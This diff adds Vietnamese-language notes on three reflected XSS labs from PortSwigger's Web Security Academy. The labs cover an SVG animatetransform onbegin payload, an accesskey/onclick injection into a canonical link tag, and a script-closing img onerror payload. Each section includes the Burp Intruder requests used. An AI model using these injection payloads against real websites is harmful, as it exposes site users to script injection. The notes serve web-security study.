@@ -547,5 +547,91 @@ Code inspect:
 </script>
 ```
 
+### Lab: Reflected XSS with some SVG markup allowed
+> Dữ kiện đề cho tag `<svg>` không bị block, việc còn lại là tìm attribute và các tag khác có thể sử dụng được.
+
+> Nếu muốn xác nhận, dùng **Burp Intruder** để  tự động hóa.
+
+Request:
+```http
+GET /?search=<$tag$> HTTP/1.1
+Host: 0a3b0094044a3900810c206f00a700ea.h1-web-security-academy.net
+```
+
+- Add ở phần `tag`
+- Truy cập [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), copy các `tags` và click `paste`
+- Check `length`, xem các request trả về có độ dài lớn là các `tags` có thể sử dụng được
+- Ta tìm được thêm tag `animatetransform` là 1 tag nằm trong thẻ `<svg>`
+- Tiếp tục tìm các `attribute` 
+Request:
+```http
+GET /?search=<svg><animatetransform $attr$=1></svg> HTTP/1.1
+Host: 0a3b0094044a3900810c206f00a700ea.h1-web-security-academy.net
+```
+
+- Tương tự các bước ở trên, copy `events` và cheat sheet và dán vào payload
+- Ở đây ta tìm thấy được thuộc tính `onbegin`
+- `onbegin` là thuộc tính nằm trong các thẻ `animate` dùng để kích hoạt sự kiện khi bắt đầu `animate`
+
+Payload:
+```
+<svg><animatetransform onbegin=alert(1)></svg>
+```
+- Tìm kiếm dựa trên payload này.
+
+### Lab: Reflected XSS in canonical link tag
+Inspect page:
+```html
+<link rel="canonical" href="https://0a9700ee0424b8098096d53e00260014.web-security-academy.net/">
+```
+- `rel="canonical"`  
+    - Đây là thẻ chuẩn hóa URL (SEO).
+    - Google dùng để biết đâu là phiên bản chính của một nội dung khi có nhiều URL trùng lặp.
+- `href` được lấy từ thanh url, nơi payload có thể hoạt động
+Payload:
+```
+https://0a0800bb047cb2448092e45700620097.web-security-academy.net/?'accesskey='x'onclick='alert(1)
+```
+
+Result:
+```html
+<link rel="canonical" href="https://0a0800bb047cb2448092e45700620097.web-security-academy.net/?" accesskey="x" onclick="alert(1)">
+```
+- `accesskey` kích hoạt attribute `onclick` khi nhấn các tổ hợp phím
+    - **On Windows:** ALT+SHIFT+X
+    - **On MacOS:** CTRL+ALT+X
+    - **On Linux:** Alt+X
+
+### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
+Inspect code:
+```html
+<script>
+    var searchTerms = 'abc';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=abc" ntouotzal="">
+```
+
+- `', \` đã bị escaped
+- Không thể sử dụng `"` để đóng `src` của **img** được vì đã bị **encodeURIComponent**
+- Ý tưởng: 
+    - Đóng thẻ script lại để thoát khỏi nó
+    - Tạo ra thẻ mới thực thi được `alert()`
+
+Payload:
+```
+</script><img src=1 onerror=alert(1)><script>
+```
+
+Inspect:
+```html
+<script> var searchTerms = '</script>
+<img src="1" onerror="alert(1)">
+<script>';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+
 ---
 Goodluck! 🍀🍀🍀
